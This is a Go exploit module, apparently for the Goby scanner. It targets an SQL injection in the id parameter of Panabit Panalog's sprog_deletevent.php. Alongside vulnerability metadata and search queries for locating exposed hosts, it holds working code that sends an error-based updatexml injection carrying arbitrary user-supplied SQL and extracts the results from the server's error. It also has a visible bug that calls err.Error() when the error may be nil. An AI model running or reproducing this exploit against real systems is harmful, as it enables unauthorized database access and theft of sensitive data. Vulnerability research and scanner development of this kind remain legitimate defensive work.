package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Panabit Panalog sprog_deletevent.php SQL injection vulnerability",
    "Description": "<p>Panabit was developed by Beijing Paiwang Software Co., LTD.</p><p>The id parameter of the /Maintain/sprog_deletevent.php file in this product has an SQL injection vulnerability, which can lead to database information leakage.</p>",
    "Product": "Panabit-Panalog",
    "Homepage": "http://www.panabit.com/",
    "DisclosureDate": "2023-02-24",
    "PostTime": "2023-08-01",
    "Author": "715827922@qq.com",
    "FofaQuery": "((body=\"id=\\\\\\\"codeno\\\\\\\"\"||body=\"id=\\\"codeno\\\"\") && body=\"日志系统\") || title=\"panalog\" ",
    "GobyQuery": "((body=\"id=\\\\\\\"codeno\\\\\\\"\"||body=\"id=\\\"codeno\\\"\") && body=\"日志系统\") || title=\"panalog\" ",
    "Level": "3",
    "Impact": "<p>The id parameter of the Panabit /Maintain/sprog_deletevent.php file has SQL injection vulnerability, which can cause database information leakage and obtain sensitive information, and may even be further exploited by attackers to cause greater harm.</p>",
    "Recommendation": "<p>1. Precompile the incoming sql statement.</p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select version()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "Panabit Panalog sprog_deletevent.php SQL 注入漏洞",
            "Product": "Panabit-Panalog",
            "Description": "<p>Panalog大数据日志审计系统定位于将大数据产品应用于高校、 公安、 政企、 医疗、 金融、 能源等行业之中，针对网络流量的信息进行日志留存，可对用户上网行为进行审计，逐渐形成大数据采集、 大数据分析、 大数据整合的工作模式，为各种网络用户提供服务。</p><p>该产品中 /Maintain/sprog_deletevent.php 文件的id参数存在SQL注入漏洞，可导致数据库信息泄露从而获取敏感信息，甚至可能被攻击者进一步利用造成更大危害。<br></p>",
            "Recommendation": "<p>1、对传入的 sql 语句进行预编译处理。</p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Panabit /Maintain/sprog_deletevent.php 文件的 id 参数存在 SQL 注入漏洞，可导致数据库信息泄露从而获取敏感信息，甚至可能被攻击者进一步利用造成更大危害。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Panabit Panalog sprog_deletevent.php SQL injection vulnerability",
            "Product": "Panabit-Panalog",
            "Description": "<p>Panabit was developed by Beijing Paiwang Software Co., LTD.</p><p>The id parameter of the /Maintain/sprog_deletevent.php file in this product has an SQL injection vulnerability, which can lead to database information leakage.</p>",
            "Recommendation": "<p>1. Precompile the incoming sql statement.</p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>The id parameter of the Panabit /Maintain/sprog_deletevent.php file has SQL injection vulnerability, which can cause database information leakage and obtain sensitive information, and may even be further exploited by attackers to cause greater harm.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10834"
}`
	sendPayloadFF59SDFscccc5s4 := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		uri := fmt.Sprintf("/Maintain/sprog_deletevent.php?openid=1&id=1%%20or%%20updatexml(1,concat(0x7e,(%s)),0)&cloudip=1", url.QueryEscape(payload))
		getConfig := httpclient.NewGetRequestConfig(uri)
		getConfig.VerifyTls = false
		getConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadFF59SDFscccc5s4(hostInfo, "md5(5)")
			return err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e4da3b7fbbce2345d7772b0674a318d")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			if attackType == "sqlPoint" {
				expResult.Success = true
				expResult.Output = `GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,(sqlPoint)),0)&cloudip=1 HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
`
				return expResult
			} else if attackType == "sql" {
				payload := stepLogs.Params["sql"].(string)
				resp, err := sendPayloadFF59SDFscccc5s4(expResult.HostInfo, payload)
				if err != nil || !(resp.StatusCode == 200 && strings.Contains(resp.RawBody, "XPATH syntax")) {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Success = true
				re := regexp.MustCompile(`'~([^']+)'`)
				match := re.FindStringSubmatch(resp.RawBody)
				matchString := fmt.Sprintf("%s", match[1])
				expResult.Output = matchString
			}
			return expResult
		},
	))
}
